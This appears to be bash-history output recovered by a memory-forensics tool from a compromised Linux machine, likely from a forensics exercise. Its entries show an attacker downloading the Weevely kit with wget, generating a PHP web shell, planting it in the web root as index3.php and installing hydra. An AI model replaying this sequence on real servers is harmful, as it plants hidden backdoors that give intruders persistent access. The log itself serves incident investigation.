Pid      Name                 Command Time                   Command
-------- -------------------- ------------------------------ -------
    8021 bash                 2015-05-04 18:04:51 UTC+0000   nmap localhost
    8021 bash                 2015-05-04 18:24:08 UTC+0000   ls
    8021 bash                 2015-05-04 18:24:23 UTC+0000   cd /
    8021 bash                 2015-05-04 18:24:23 UTC+0000   ls
    8021 bash                 2015-05-04 18:31:00 UTC+0000   uname -a
    8021 bash                 2015-05-04 18:35:48 UTC+0000   ls
    8021 bash                 2015-05-04 18:35:48 UTC+0000   cd /tmp
    8021 bash                 2015-05-04 18:36:04 UTC+0000   ls -l
    8021 bash                 2015-05-04 18:36:06 UTC+0000   ls -al
    8021 bash                 2015-05-04 18:36:33 UTC+0000   cd /home/john
    8021 bash                 2015-05-04 18:36:34 UTC+0000   ls
    8021 bash                 2015-05-04 18:37:27 UTC+0000   insmod ./lime-3.16.0-30-generic.ko "tcp:4444 format=lime"
    8021 bash                 2015-05-04 18:38:04 UTC+0000   insmod ./lime-3.16.0-30-generic.ko "path=tcp:4444 format=lime"
    9210 bash                 2015-05-04 18:16:26 UTC+0000   cd /usr/local/mysql
    9210 bash                 2015-05-04 18:16:26 UTC+0000   ls
    9210 bash                 2015-05-04 18:16:26 UTC+0000   ./weevely.py generate 'hacked'
    9210 bash                 2015-05-04 18:16:26 UTC+0000   ls -a
    9210 bash                 2015-05-04 18:16:26 UTC+0000   ls /usr/local/mysql
    9210 bash                 2015-05-04 18:16:26 UTC+0000   ls
    9210 bash                 2015-05-04 18:16:26 UTC+0000   wget http://dl.packetstormsecurity.net/UNIX/penetration/rootkits/weevely-0.7.tar.gz
    9210 bash                 2015-05-04 18:16:26 UTC+0000   mv weevely .weevely
    9210 bash                 2015-05-04 18:16:26 UTC+0000   cp weevely.php /var/www/html/index3.php
    9210 bash                 2015-05-04 18:16:26 UTC+0000   python weevely.py 
    9210 bash                 2015-05-04 18:16:26 UTC+0000   cd .weevely
    9210 bash                 2015-05-04 18:16:26 UTC+0000   sudo apt-get install hydra
    9210 bash                 2015-05-04 18:16:26 UTC+0000   python weevely.py generate.php
    9210 bash                 2015-05-04 18:16:26 UTC+0000   sudo apt-get install python-beautifulsoup
    9210 bash                 2015-05-04 18:16:26 UTC+0000   cd /tmp
    9210 bash                 2015-05-04 18:16:26 UTC+0000   tar xavf weevely-0.7.tar.gz 
    9210 bash                 2015-05-04 18:16:26 UTC+0000   ls -l
    9210 bash                 2015-05-04 18:16:26 UTC+0000   ./weevely.py generate 'hacked'
    9210 bash                 2015-05-04 18:16:26 UTC+0000   rm *.gz
    9210 bash                 2015-05-04 18:16:26 UTC+0000   more README 
    9210 bash                 2015-05-04 18:16:26 UTC+0000   mv /home/mysqll/ /usr/local/mysql
    9210 bash                 2015-05-04 18:16:26 UTC+0000   ls
